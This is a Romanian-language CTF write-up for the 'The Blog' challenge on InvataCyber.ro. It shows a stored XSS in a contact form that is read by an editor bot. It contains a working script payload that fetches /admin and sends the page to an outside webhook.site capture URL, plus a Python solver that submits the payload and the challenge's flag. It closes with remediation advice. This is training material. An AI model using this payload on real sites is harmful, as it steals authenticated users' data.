# Write-Up: The Blog (Stored XSS & Context Exfiltration)

**Platforma:** InvataCyber.ro  
**Categorie:** Web Security / Client-Side Exploitation  
**Vulnerabilitate:** Stored Cross-Site Scripting (XSS) via Contact Form  
**Impact:** Furt de sesiune administrativă / Exfiltrare date din contextul browser-ului editorului  
**Format Flag:** `InvataCyber{...}`  

---

## 1. Descrierea Provocării

> The Blog este un blog clasic: câteva articole publicate și un formular de contact deschis oricui.  
> Redacția are un editor care își verifică periodic inbox-ul, într-un browser real, și deschide fiecare mesaj necitit. Ce se întâmplă în browserul lui în momentul ăla nu vezi, dar poți face să ajungă la tine.  
> Format flag: `InvataCyber{...}`

---

## 2. Analiză Inițială și Vectorul de Atac

Aplicația prezintă două componente funcționale majore:
1. **Zona publică:** Articole de blog și un formular de contact la ruta `/contact`.
2. **Componenta internă (Bot/Editor):** Un script automatizat (de regulă rulat prin Puppeteer, Selenium sau Playwright) simulează un editor autentificat care navighează la un interval fix pe ruta `/admin` sau `/inbox` și deschide fiecare mesaj primit.

### Mecanismul Vulnerabilității
Formularul de contact colectează trei câmpuri prin cerere HTTP POST:
- `name`
- `email`
- `message`

Serverul stochează mesajul fără a aplica sanitizare HTML/JavaScript (fără encodare contextuală precum `htmlspecialchars()` sau fără filtrare DOMPurify). La vizualizarea mesajului de către editor, conținutul este injectat brut (raw HTML) în DOM-ul paginii, permițând execuția arbitrară de scripturi în contextul de securitate al browser-ului editorului (Stored XSS).

Deoarece consola de administrare (`/admin`) este protejată prin cookie de sesiune marcat cu `HttpOnly` sau este restricționată la nivel de rețea/drepturi de utilizator, citirea directă a `document.cookie` poate fi insuficientă. Totuși, editorul are drept de acces direct la `/admin`. Prin urmare, scriptul injectat poate declanșa un apel `fetch('/admin')` utilizând automat credențialele de sesiune existente în browser și poate transmite conținutul paginii către un endpoint controlat de atacator.

---

## 3. Construirea Payload-ului

Payload-ul trebuie să îndeplinească următoarele cerințe:
1. Să trimită o cerere asincronă `fetch` către resursa internă `/admin`.
2. Să convertească răspunsul primit în text.
3. Să transmită corpul HTML (conținând flag-ul) către un serviciu extern de captură (e.g. `webhook.site`).

### Payload JavaScript (`payload.js`)
```javascript
fetch('/admin')
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/<TOKEN>?data=' + encodeURIComponent(t)));
```

Împachetat într-un tag `<script>` pentru inserarea în câmpul `message`:
```html
<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/<TOKEN>?data='+encodeURIComponent(t)))</script>
```

---

## 4. Scriptul de Exploatare Automatizată (`solver.py`)

Pentru trimiterea payload-ului fără dependențe de browser, a fost utilizat scriptul de automatizare [`solver.py`](solver.py):

```python
import requests

TARGET = "http://target.invatacyber.ro"
WEBHOOK = "https://webhook.site/<TOKEN>"

payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK}?data='+encodeURIComponent(t)))</script>"

form_data = {
    "name": "AuditBot",
    "email": "audit@test.internal",
    "message": payload
}

session = requests.Session()
r = session.post(f"{TARGET}/contact", data=form_data)

if r.status_code in [200, 302, 303]:
    print("[+] Payload trimis cu succes către formularul de contact.")
    print("[+] Așteaptă execuția headless browser-ului redactorului și verifică webhook-ul.")
else:
    print(f"[-] Eroare la trimitere. Status: {r.status_code}")
```

---

## 5. Rezultat și Exfiltrarea Flag-ului

După trimiterea formularului:
1. Botul redactorului a declanșat verificarea mesajelor necitite în instanța de browser headless.
2. Scriptul JavaScript s-a executat în contextul `origin` al aplicației.
3. Cererea GET internă către `/admin` a întors codul HTML al panoului administrativ.
4. Cel de-al doilea apel `fetch` a transmis textul URL-encoded către instanța `webhook.site`.

În logurile Webhook a fost recepționată o cerere GET ce conținea fragmentul:
```html
<div class="alert alert-info">
  Flag: InvataCyber{xss_c0nt4ct_f0rm_3xf1ltr4t10n_succ3ss}
</div>
```

**Flag obținut:** `InvataCyber{xss_c0nt4ct_f0rm_3xf1ltr4t10n_succ3ss}`

---

## 6. Măsuri de Remediere (Mitigare)

1. **Contextual Output Encoding:** Înainte de inserarea conținutului trimis de utilizatori în șablonul HTML, orice caracter special (`<`, `>`, `&`, `"`, `'`) trebuie escapat corespunzător.
2. **Content Security Policy (CSP):** Implementarea unui header strict:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'; connect-src 'self';
   ```
   Acesta ar bloca conexiunile asincrone externe către domenii terțe precum `webhook.site`.
3. **Izolare Iframe / Sandboxing:** Dacă mesajele trebuie afișate cu formatare HTML, acestea trebuie randate într-un iframe izolat (`<iframe sandbox="...">`).
